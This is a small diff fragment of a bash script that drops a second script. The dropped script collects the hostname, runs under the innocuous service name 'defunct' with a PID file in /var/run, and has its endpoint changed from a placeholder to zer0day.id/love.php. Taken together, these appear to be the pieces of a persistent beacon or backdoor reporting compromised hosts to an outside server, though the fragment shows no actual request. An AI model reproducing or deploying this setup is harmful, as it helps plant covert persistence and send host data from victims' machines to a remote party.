@@ -12,7 +12,7 @@ cat << 'EOF' > "$self_love"
 #!/bin/bash
 
 host=$(hostname)
-php_endpoint="https://yourwebsite.com/love.php"  
+php_endpoint="https://zer0day.id/love.php"  
 service_name="defunct"
 pid_file="/var/run/self.pid"
 
